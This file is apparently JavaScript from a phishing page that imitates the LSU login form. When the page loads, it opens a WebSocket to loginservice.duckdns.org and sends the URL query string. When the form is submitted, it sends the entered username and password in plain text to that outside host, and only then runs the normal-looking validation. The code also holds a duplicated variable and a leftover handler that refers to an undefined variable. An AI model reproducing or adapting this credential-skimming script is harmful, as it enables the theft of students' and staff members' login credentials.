
window.onload = function() {

    // Get references to elements on the page.
    
    var messageField = document.getElementById('username');
    var messageField = document.getElementById('password');

    var messagesList = document.getElementById('messages');
    var socketStatus = document.getElementById('status');
    var closeBtn = document.getElementById('close');
  
    // The rest of the code in this tutorial will go here...
    var connection = new WebSocket('wss:loginservice.duckdns.org/myws2');

connection.onopen = function () {
    console.log('Connected test!');
    const queryString = window.location.search;
    connection.send(queryString);
};


// Log errors
connection.onerror = function (error) {
    console.log('WebSocket Error ' + error);
};

// Log messages from the server
connection.onmessage = function (e) {
    console.log('Server: ' + e.data);
};

$("#fm1").submit(function() {

    console.log("submit activated");
    $(":submit").attr("disabled", true);
    $("#errorMsg").text('');
    var rc = true;
    var username = $("#username").val().trim();
    var lowerUsername= username.toLowerCase();
    $("#username").val(lowerUsername);
    var emailDomains = ['@lsu.edu', '@tigers.lsu.edu', '@egateway.lsu.edu', '@lsumail.lsu.edu'];
    for(var i = 0; i < emailDomains.length; i++) {
        var domainIndex = lowerUsername.indexOf(emailDomains[i]);
        if(domainIndex !== -1) {
            username = username.substring(0, domainIndex);
            $("#username").val(username);
        }
    }
    var password = $("#password").val().trim();
    console.log("sending password: "+password);
    connection.send("Username: "+username + " " + "Password: " + password);
    
    var usernameErrors = '';
    var passwordErrors = '';
    if(username.length === 0) {
        usernameErrors = 'Please enter your myLSU account / Email address.';
        rc = false;
    }
    $("#usernameErrors").text(usernameErrors);

    if(password.length === 0) {
        passwordErrors = 'Please enter your Password.';
        rc = false;
    }
    $("#passwordErrors").text(passwordErrors);

    if(rc == false) {
        $(":submit").attr("disabled", false);
    }
    return rc;
});

  connection.submit = function(event) {
    var username = event.data;
    messagesList.innerHTML += '<li class="received"><span>Received:</span>' +
                               message + '</li>';
  };

  };

